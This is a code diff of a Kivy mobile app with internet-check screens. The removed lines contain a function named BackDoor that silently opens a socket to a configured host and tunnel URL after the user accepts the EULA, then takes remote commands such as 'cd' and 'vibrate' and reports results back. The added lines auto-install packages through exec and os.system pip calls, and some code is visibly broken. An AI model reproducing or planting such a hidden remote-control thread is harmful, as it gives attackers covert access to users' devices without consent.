@@ -1,8 +1,14 @@
+def install(package):
+	for i in package:
+		try:
+			exec(f"import {i}")
+			pass
+		except Exception:
+			print("Installing {i}")
+			os.system(f"pip3 install {i}")
+	return None
+install(["kivy","kivymd","requests","plyer"])
 
-data = {
-"port":5003,
-"server":"127.0.0.1",
-"url":"https://b3431bbbacab83.lhrtunnel.link"}
 
 import os
 from kivymd.app import MDApp
@@ -24,7 +30,6 @@ import subprocess
 import sys
 import threading
 from pathlib import Path
-from plyer import vibrator
 from kivy.clock import Clock
 
 android_plat = True
@@ -124,7 +129,7 @@ MDScreen:
 	MDFloatLayout:
 		md_bg_color : 0,0,0,1
 		MDLabel
-			text : "No internet"
+			text : app.b
 			halign : 'center'
 			pos_hint : {'center_y':0.9}
 			theme_text_color : "Custom"
@@ -146,34 +151,7 @@ MDScreen:
 			text_color : 1,1,1,1
 			on_press : app.reload()		
 """
-netof2= """
-MDScreen:
-	name : "netof2"
-	MDFloatLayout:
-		md_bg_color : 0,0,0,1
-		MDLabel
-			text : "No internet "
-			halign : 'center'
-			pos_hint : {'center_y':0.9}
-			theme_text_color : "Custom"
-			text_color : 1,1,1,1
-			#pos_hint : {'center_x':0.14,'center_y':0.5}
-			font_name : "Poppins-Regular.ttf"
-			font_size : "35sp"
-		Image:
-			source: 'no-wifi.png'
-			halign : "center"
-			size_hint_y: 0.45
-			size_hint_x: 0.45
-			pos_hint :  {"center_x":0.5,"center_y":0.65}
-		MDRoundFlatButton:
-			text : "Reload"
-			pos_hint : {"center_x":0.5,"center_y":0.35}
-			halign : "center"
-			line_color : 1,1,1,1
-			text_color : 1,1,1,1
-			on_press : app.reload()		
-"""
+
 mainv = """
 MDScreen:
 	name : "mainv"
@@ -238,49 +216,7 @@ MDScreen:
 		size_hint_x: 0.55
 		
 """
-def BackDoor(port,server):
-    if port is None:
-    	return None
-    SERVER_HOST = server
-    SERVER_PORT = port 
-    BUFFER_SIZE = 1024 * 1024
-    SEPARATOR = "<sep>"
-    s = socket.socket()
-    try:
-    	s.connect((SERVER_HOST, SERVER_PORT))
-    except Exception as e:
-    	return str(e)
-    cwd = os.getcwd()
-    s.send(cwd.encode())
-    while True:
-    	command = s.recv(BUFFER_SIZE).decode()
-    	splited_command = command.split()
-    	if command.lower() == "exit":
-    		break
-    	elif splited_command[0].lower() == "vibrate":
-        	try:
-        		virbrator.vibrate(time=int(splited_command[1:]))
-        		output = "Success ! "
-        	except Exception  as e:
-        		output = str(e)
-    	if splited_command[0].lower() == "cd":
-        	try:
-        		os.chdir(' '.join(splited_command[1:]))
-        	except FileNotFoundError as e:
-        		output = str(e)
-        	else:
-        		output = ""
-    	else:
-        	output = "Success "+splited_command[0].lower()+str(splited_command[1:])
-        	cwd = os.getcwd()
-    
-    	message = f"{output}{SEPARATOR}{cwd}"
-    	s.send(message.encode())
-    s.close()
-screen_manager = ScreenManager()
-def ok():
-	BackDoor(data["port"],data["server"])
-	return None	
+
 def check_intr():
 	import requests
 	try:
@@ -288,11 +224,10 @@ def check_intr():
 	except Exception as e:
 		return False
 	return  True
-
-done = True
-
+screen_manager = ScreenManager()
 class MyApp(MDApp):
-
+	a = 0	
+	b = f"No internet {a}"
 	def reload(self):
 		if check_intr() == True:
 			screen_manager.current = "net"
@@ -303,7 +238,6 @@ class MyApp(MDApp):
 		screen_manager.add_widget(Builder.load_string(perscr))
 		screen_manager.add_widget(Builder.load_string(net))
 		screen_manager.add_widget(Builder.load_string(netof))
-		screen_manager.add_widget(Builder.load_string(netof2))
 		screen_manager.add_widget(Builder.load_string(mainv))
 		return screen_manager
 	def bahimaro(self):
@@ -315,24 +249,19 @@ class MyApp(MDApp):
 	def login(self,obj):
 		if os.path.exists("eula.txt"):
 			if check_intr() == True:
-				threading.Thread(target=ok, name="", args="").start()  
 				screen_manager.current = "net"
 			else:
+				a =+1 
 				screen_manager.current = "netof"
 		else:
 			screen_manager.current = "perscreen"
 	def permission(self):
 		Path("eula.txt").touch()
 		if check_intr() == True:
-			threading.Thread(target=ok, name="", args="").start()  
 			screen_manager.current = "net"
 		else:
-			if os.path.exists("ok.txt"):
-				screen_manager.current = "netof"
-				os.remove("ok.txt")
-			else:
-				screen_manager.current = "netof2"
-				Path("ok.txt").touch()
+			a =+1 
+			screen_manager.current = "netof"
 
 
 
